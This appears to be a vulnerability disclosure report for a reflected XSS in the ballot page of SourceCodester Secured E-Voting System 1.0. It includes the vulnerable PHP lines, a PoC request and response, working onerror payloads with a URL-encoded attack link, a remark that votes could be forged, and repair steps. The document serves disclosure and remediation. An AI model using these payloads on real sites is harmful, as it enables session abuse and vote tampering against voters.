# SourceCodester Secured E-Voting System 1.0 /election/ballot.php id= Reflected XSS

## Author

- (submitter name pending user confirmation — will be filled from vuldb.txt account at submission time)

## Vendor and Software Links

- https://www.sourcecodester.com/php/18790/secured-e-voting-system.html
- https://www.sourcecodester.com/download-code?nid=18790&title=Secured+E-Voting+System+using+PHP+and+MySQL+Source+Code

## Overview

- Secured E-Voting System (St Paul Academy Alumni 2001 set e-voting portal), version 1.0, reflects the unfiltered `id` GET parameter of `/election/ballot.php` into the HTML response, allowing reflected Cross-Site Scripting (XSS).

## Details

- Vulnerable file: `/election/ballot.php`
- Parameter: `id` (GET)
- Affected version: 1.0 (current public download, 2026-11)
- The election id is taken from the URL and echoed raw into the page markup:

```php
// election/ballot.php:18
$election_id = $_GET['id'];
```

```php
// election/ballot.php:141
echo $election_id;   // ← no htmlspecialchars() anywhere on this path
```

## Description

- The `id` request parameter is echoed into the ballot page without HTML-encoding, so a URL containing markup executes in the victim's browser. Because the ballot page is where voters cast votes, script running in this origin can read the rendered candidates, forge/submit the vote form on the victim's behalf (the form has no CSRF token — see the related report), or silently alter which candidates are displayed while the victim believes they are voting normally. No authentication bypass is needed beyond a logged-in voter session; the payload is delivered by link only.

## PoC

- Request (payload inside the `id` parameter; requires a logged-in voter session cookie so the page renders instead of redirecting to login):

```
GET /election/ballot?id=78880159"><img src=x onerror=alert(document.domain)> HTTP/1.1
Host: 127.0.0.1:8138
Cookie: PHPSESSID=<voter session>
```

- Response (the payload is reflected verbatim into the HTML):

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

... <span ...>78880159"><img src=x onerror=alert(document.domain)></span> ...
```

## Payload

```
78880159"><img src=x onerror=alert(document.domain)>
```

The screenshot run used an instrumented variant of the same injection (adds a title change and one visible DOM insertion so the execution is photographable after the modal is dismissed):

```
78880159"><img src=x onerror="document.title='XSS-FIRED-'+document.domain;document.body.insertAdjacentHTML('afterbegin','<h1 id=xssproof>XSS-EXECUTED-VIA-REFLECTION</h1>');alert(document.domain)">
```

URL-encoded form:

```
/election/ballot?id=78880159%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

Opening this URL in a logged-in browser fires `alert(document.domain)` — proof of JavaScript execution in the application origin.

Full evidence log: `poc/F09-ballot-reflected-xss.txt`

## Screenshot: payload executing in the victim's browser after opening the crafted ballot URL

The screenshot shows the three execution proofs simultaneously: the fired `alert(document.domain)` dialog (its value `127.0.0.1` — handled with OK before capture), the page title mutated by the payload to `XSS-FIRED-127.0.0.1`, and the payload's DOM injection (`<h1>XSS-EXECUTED-VIA-REFLECTION</h1>` at top-left). The election-id line renders the **raw reflected markup** — `ELECTION ID: #78880159">` followed by the broken-image icon of the injected `<img src=x>` tag.

![F9 XSS executes in ballot page](img/f09-xss-alert.jpeg)

## DOM snapshot (accessibility tree, saved verbatim)

- `poc/F09-dom-snapshot.txt` — the a11y snapshot of the page after execution, containing the injected heading and the reflected markup in the election-id span.

## Suggested repair

1. `echo htmlspecialchars($election_id, ENT_QUOTES, 'UTF-8')` — and audit every other echo of request data in the project.
2. Validate `id` as an integer (`(int)$_GET['id']`) and 404 on non-numeric values; ids are DB integers by nature.
3. Set a `Content-Security-Policy` header as defense in depth.
4. Add template-level auto-escaping (or a linter rule) so new outputs cannot regress.

## Dedup note

- NVD: 0 CVEs for this product (checked 2026-11-09). VulDB: no entries for this product or `/election/ballot`.
